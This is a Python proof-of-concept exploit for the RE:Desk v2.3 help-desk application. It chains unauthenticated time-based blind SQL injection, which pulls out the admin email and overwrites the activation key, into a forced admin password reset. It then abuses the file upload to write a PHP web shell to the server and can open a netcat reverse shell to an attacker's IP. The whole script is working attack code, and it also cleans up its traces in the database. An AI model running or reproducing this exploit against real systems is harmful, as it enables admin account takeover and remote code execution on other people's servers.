import requests
import sys
import string
import random
import uuid
import os
from time import sleep
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
#optional burp proxy
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

printable = set(string.printable)

def getBaseReference_unauth_sqli(ip, inj_str, sleep_time, i, a_to, a_from):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    for j in range(a_to, a_from):
        r = ''
        payload = inj_str.replace("[TWO]", str(j))
        payload = payload.replace("[ONE]", str(i))
        target = "%s/?folder[]=%s" % (ip, payload)
        r = requests.get(target, headers=headers, proxies=proxies) 
        if (r.elapsed.total_seconds() >= sleep_time):
            return j
    return False

def set_activkey_to_known_value(ip, admin_email, rand_activkey, sleep_time):
    target = '%s/?folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b+UPDATE+tbl_users+SET+activkey+=+%%22%s%%22+WHERE+email+=+%%22%s%%22%%3b+--' % (ip, rand_activkey, admin_email)
    r = requests.get(target, proxies = proxies)
    check_activkey = ("%s/?folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b++SELECT+IF(((select+activkey+from+tbl_users+where+email+=+%%22%s%%22)+=+%%22%s%%22),(SELECT+sleep(%d)),'a')%%3b+--" % (ip,admin_email, rand_activkey, sleep_time))
    r_c = requests.get(check_activkey, proxies = proxies)
    if (r_c.elapsed.total_seconds() >= sleep_time):
        return True
    else:
        return False

def get_chars(limit, ip, sleep_time, injection_string, num):
    obtained_string = ''
    try:
        sys.stdout.write('[+] ')
        for i in range(1, limit):
            if num:
                extracted_char = chr(getBaseReference_unauth_sqli(ip, injection_string, sleep_time, i, 48, 58))
            else:
                extracted_char = chr(getBaseReference_unauth_sqli(ip, injection_string, sleep_time, i, 32, 127))
            sys.stdout.write(extracted_char)
            if (extracted_char != False & extracted_char.isalpha()):
                obtained_string += extracted_char
            sys.stdout.flush()
        return obtained_string
    except TypeError as te:
        return obtained_string

def reset_admin_password(ip, admin_email, activkey, new_pw):
    print_email = admin_email
    admin_email = admin_email.replace('@', '%40')
    url = '%s/user/recovery/recovery?email=%s&activkey=%s' % (ip, admin_email, activkey) #yup POST with query string
    headers = {'Content-Type' : 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    body = 'UserChangePassword%%5Bpassword%%5D=%s&UserChangePassword%%5BverifyPassword%%5D=%s&yt0=Save' % (new_pw, new_pw)
    s = requests.Session()
    r = s.post(url, data=body, headers=headers, proxies=proxies)                
    if "New password is saved." in r.text:
        print("\n[+] SUCCESS: successfully reset %s account's password" % print_email)
        print("[+] NEW CREDENTIALS: %s:%s" % (print_email, new_pw))
        return (True, s)
    else:
        print("[X] could not reset %s account password, aborting." %  print_email)
        return (False, False)

def login(ip, admin_email, new_pw):
    print_email = admin_email
    admin_email = admin_email.replace('@', '%40')
    url = '%s/user/login' % ip 
    headers = {'Content-Type' : 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    body = 'UserLogin%%5Busername%%5D=%s&UserLogin%%5Bpassword%%5D=%s&UserLogin%%5BrememberMe%%5D=0&yt0=' % (admin_email, new_pw)
    s = requests.Session()
    r = s.post(url, data=body, headers=headers, proxies=proxies)
    if "Sign out" in r.text:
        settings_url = '%s/settings' % ip
        settings_check = s.get(settings_url, proxies = proxies)
        if settings_check.status_code == 200:
            print("[+] successflly athenticated as admin with email: %s" % print_email)
            return (True, s)
        else:
            print("[*] successfully athenticated as user with email: %s, HOWEVER user is not an admin??" % print_email)
            print("[*] continuing anyway...")
            return (True, s)
    else:
        print("[X] could not authenticate as %s, aborting. Try logging in through browser?")
        return (False, False)

def fetch_revshell(ip, session, shell_filename):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    url = '%s/protected/runtime/%s' % (ip, shell_filename)
    r = session.get(url, headers=headers, proxies=proxies)
    if (r.elapsed.total_seconds() > 3):
        print('[+] retrieved shell, check nc')
        sys.exit(0)
    else:
        print('[!] check nc for shell or other issues')
        sys.exit(-1)

def set_id_field_type_to_varchar(ip, s):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    target = '%s/?folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b+ALTER+TABLE+tbl_ticket_message_attachment+MODIFY+id+varchar(250)%%3b+--' % ip
    r = s.get(target,headers=headers, proxies = proxies)
    return True

def reset_id_field_type(ip, s):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    target = '%s/?folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b+ALTER+TABLE+tbl_ticket_message_attachment+MODIFY+id+int+auto_increment%%3b+--' % ip
    r = s.get(target, headers=headers, proxies = proxies)
    return True

def delete_uploaded_file_entry_from_db(ip, s, file_name ):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    target = '%s/?folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b+DELETE+FROM+tbl_ticket_message_attachment+WHERE+file_name+=+%%22%s%%22%%3b+--' % (ip, file_name)
    r = s.get(target, headers=headers, proxies = proxies)
    return True

def update_htaccess_attachment_id(ip, s, file_id):
    headers = {'Content-Type' : 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    target = '%s/' % ip
    body = 'folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b+update+tbl_ticket_message_attachment+set+id+=%%22../%%22+where+id+=+%%22%s%%22%%3b+--' % file_id
    r = s.post(target, body, headers=headers, proxies=proxies)
    return True

def trigger_file_put_contents(ip, session, file_id):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    if ip[-1] == '/':
        ip = ip[:-1]
    target = '%s/ticketMessage/preview/%s' % (ip, file_id)
    r = session.get(target, headers=headers, proxies = proxies)
    return True

def check_file_uploaded(ip, file_name, sleep_time):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    check_file_exists = ("%s/?folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b+select+if+((select+count(file_name)+from+tbl_ticket_message_attachment+where+file_name+=+%%22%s%%22),(select+sleep(%d)),1)%%3b+--" % (ip, file_name, sleep_time))
    r_c = requests.get(check_file_exists, headers=headers, proxies = proxies)
    if (r_c.elapsed.total_seconds() >= sleep_time):
        return True
    else:
        return False 

def submit_ticket(ip, s, file_name, content_type, sleep_time):
    # returns filename file id
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    url = '%s/ticket/create' % ip
    files = {'attachments[]': (file_name, open(file_name, 'r').read(), content_type),
    'Ticket[category_id]' : (None,1), 
    'Ticket[author_name]': (None,'test'), 
    'Ticket[author_email]': (None,'test@nowhere.org'),
    'Ticket[content]' : (None,uuid.uuid4().hex),
    'Ticket[subject]' : (None,uuid.uuid4().hex),
    'yt0' : (None,'')}
    r = s.post(url, files=files, headers=headers, proxies=proxies)
    sleep(5)
    if check_file_uploaded(ip, file_name, sleep_time):
        print("[*] uploaded %s, getting file id in tbl_ticket_message_attachment..." % file_name)
        get_file_id = ("1337))+GROUP+BY+ticket.id)+sq%%3b++SELECT+IF(((ascii(substring((select+id+from+tbl_ticket_message_attachment+where+file_name+=+%%22%s%%22),[ONE],1)))=[TWO]),(SELECT+sleep(%d)),'a')%%3b+--" % (file_name, sleep_time))
        file_id = get_chars(6, ip, sleep_time, get_file_id, True)
        file_id = ''.join(filter(lambda x: x in printable, file_id))
        if(int(file_id) > 0):
            return(True, file_id)
        else:
            print("[X] could not get file id, deleting uploaded file...")
            delete_uploaded_file_entry_from_db(ip, s, file_name)
            return (False, False)
    else:
        return (False, False)

def gen_htaccess():
    # so it doesn't overwrite any existing .htaccess files in the current directory
    ht_filename = uuid.uuid4().hex + '.txt'
    touch = 'touch %s' % ht_filename
    os.system(touch)
    return ht_filename

def gen_webshell():
    #limited web shell
    shell = "<?php system($_GET['cmd']) ?>"
    shell_filename = uuid.uuid4().hex + '.txt'
    with open(shell_filename, 'w') as sh:
        sh.write(shell)
        sh.close()
    return shell_filename  

def execute_command(ip, session, shell_file_id, cmd, shell):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    url = '%s/protected/runtime/%s.php?cmd=%s' % (ip, shell_file_id, cmd)
    try:
        r = session.get(url, headers=headers, proxies=proxies, timeout=0.5)
        if not shell:
            if (r.status_code == 200):   
                print('[+] %s command executed, output:\n' % cmd)
                if len(r.text) > 0:
                    print(r.text)
                else:
                    print('[!] could not get command output, check manually...')
            else:
                print('[!] could not execute command, try uploading manually?')
                sys.exit(-1)
    except requests.exceptions.ReadTimeout:
        pass

def enable_account(ip, admin_email):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    target = '%s/?folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b+update+tbl_users+set+status+=+1+where+email+=+%%22%s%%22%%3b+--' % (ip, admin_email)
    r = requests.get(target,headers=headers, proxies = proxies)
    return True    

def main():
    print("\n[+] RE:Desk v2.3 unauthenticated SQLI + forced admin password reset (authentication bypass) + insecure file upload RCE")
    print("\n[!] this PoC re-sets the password to the admin account, also enables the account if banned, via SQLi")
    print("[!] password resets are done via abuse of the app's weak password reset controls")
    print("[!] it then abuses an insecure file upload vulnerability to upload an executable PHP web shell to the")
    print("[!] /protected/runtime directory\n")
    if len(sys.argv) < 2:
        print("[!] usage: python3 %s <target> " % sys.argv[0])
        print('[!] eg: python3 %s https://example.com/redesk/' % sys.argv[0])
        print('[!] or opt for a reverse TCP shell, eg: python3 %s https://example.com/redesk/ 127.0.0.1 80' % sys.argv[0])
        sys.exit(-1)
    ip = sys.argv[1]
    rev_ip = rev_port = ''
    if len(sys.argv) == 4:
        print("[*] reverse TCP shell option selected, make sure nc is listening...")
        rev_ip = sys.argv[2]
        rev_port = sys.argv[3]
    sleep_time = 1.0 # recommend setting to over 3.0 if target is over internet/latency is high 
    rand_activkey = uuid.uuid4().hex
    new_admin_pw = uuid.uuid4().hex
    print("[*] getting admin account email address (first one found ordered by username)...")
    # get's first superuser ordered by id asc.
    get_email_chars = "1337))+GROUP+BY+ticket.id)+sq%%3b++SELECT+IF(((ascii(substring((select+email+from+tbl_users+where+superuser+=+1+order+by+username+asc+limit+1),[ONE],1)))=[TWO]),(SELECT+sleep(%d)),'a')%%3b+--" % sleep_time
    # make sure that email address check limit length (default of 20), sleep_time, etc are sane values. 
    # set to 50 or so if really unsure/email addresses look long
    admin_email = get_chars(20,ip, sleep_time, get_email_chars, False)
    admin_email = ''.join(filter(lambda x: x in printable, admin_email))
    print("\n[+] admin account's email address is: %s" % admin_email)
    print("[*] tenatively unbanning/enabling account with email: %s (just in case)" % admin_email)
    enable_account(ip, admin_email)
    print("[*] resetting activkey for account with email: %s to random MD5 value: %s" % (admin_email, rand_activkey))
    check_activkey_result = set_activkey_to_known_value(ip, admin_email, rand_activkey, sleep_time)
    if not check_activkey_result:
        print("[X] activkey check failed, aborting")
        sys.exit(-1)
    print("[+] successfully set activkey for account with email: %s" % admin_email)
    print("[*] resetting admin account's password to: %s" % new_admin_pw)
    reset_admin_pw = reset_admin_password(ip, admin_email, rand_activkey, new_admin_pw)
    if reset_admin_pw[0]:
        print("\n[*] logging in as %s..." % admin_email)
        login_check = login(ip, admin_email, new_admin_pw)
        if not login_check[0]:
            sys.exit(-1)
        auth_session = login_check[1]
        htaccess_filename = gen_htaccess()
        print("[*] uploading blank .htaccess in file: %s" % htaccess_filename)
        htaccess_file_id = submit_ticket(ip, auth_session, htaccess_filename, 'image/htaccess', sleep_time)
        if htaccess_file_id[0] == False:
            print("[X] could not upload htaccess file to DB, try manually. Aborting...")
            sys.exit(-1)
        htaccess_file_id = htaccess_file_id[1]
        print("\n[+] uploaded blank .htaccess, file id: %s..." % htaccess_file_id)
        shell_filename = gen_webshell()
        print("[*] uploading PHP shell in file: %s" % shell_filename)
        shell_file_id = submit_ticket(ip, auth_session, shell_filename, 'image/php', sleep_time)
        if shell_file_id[0] == False:
            print("[X] could not upload PHP shell to DB, try maunually. Aborting...")
            sys.exit(-1)
        shell_file_id = shell_file_id[1]
        print("\n[+] uploaded PHP shell, file id: %s..." % shell_file_id)
        try:
            print("[*] setting id field in tbl_ticket_message_attachment to varchar(250)...")
            set_id_field_type_to_varchar(ip, auth_session)
            sleep(sleep_time)
            print("[*] setting id value in tbl_ticket_message_attachment to '../' for .htaccess file in DB...")
            update_htaccess_attachment_id(ip, auth_session, htaccess_file_id)
            sleep(sleep_time)
            print("[*] triggering file_put_contents() to write .htaccess file to target...")
            trigger_file_put_contents(ip, auth_session, '0')
            print("[*] writing shell to disk on target...")
            trigger_file_put_contents(ip, auth_session, str(shell_file_id))
            shell_uri = '/protected/runtime/%s.php' % shell_file_id
            shell_url = ip + shell_uri
            if requests.get(shell_url).status_code == 200:
                print("\n[+] SUCCESS: wrote shell to disk on target")
                print("\n[*] cleanup: deleting .htaccess and PHP file contents from db...")
                delete_uploaded_file_entry_from_db(ip, auth_session, htaccess_filename)
                delete_uploaded_file_entry_from_db(ip, auth_session, shell_filename)
                print("[*] cleanup: setting id field in tbl_ticket_message_attachment back to int auto_increment...")
                reset_id_field_type(ip, auth_session)
                print("[+] done.")
                print("[*] executing 'id' command to test...")
                execute_command(ip, auth_session, shell_file_id, 'id', False)
                print("[+] shell url: %s" % shell_url)
                if len(sys.argv) == 4:
                    print("[*] executing reverse tcp connection to %s, make sure nc is listening on port: %s" % (rev_ip, rev_port))
                    rev_cmd = 'rm+/tmp/f%%3bmkfifo+/tmp/f%%3bcat+/tmp/f|/bin/sh+-i+2>%%261|nc+%s+%s+>/tmp/f' % (rev_ip, rev_port)
                    execute_command(ip, auth_session, shell_file_id, rev_cmd, True)
                sys.exit(0)
            else:
                print("[X] could not upload/access PHP shell, try maunually. Aborting...")
                raise Exception
        except Exception as e:
            print("\n[X] ERROR: %s" % e)
            print("[*] cleanup: attempting to delete possibly updated DB records,\n  seting id field in tbl_ticket_message_attachment back to int auto_increment...")
            delete_uploaded_file_entry_from_db(ip, auth_session, htaccess_filename)
            delete_uploaded_file_entry_from_db(ip, auth_session, shell_filename)
            reset_id_field_type(ip, auth_session)
            print("[X] aborting...")
            sys.exit(-1)

    else:
        sys.exit(-1)    

if __name__ == "__main__":
    main()

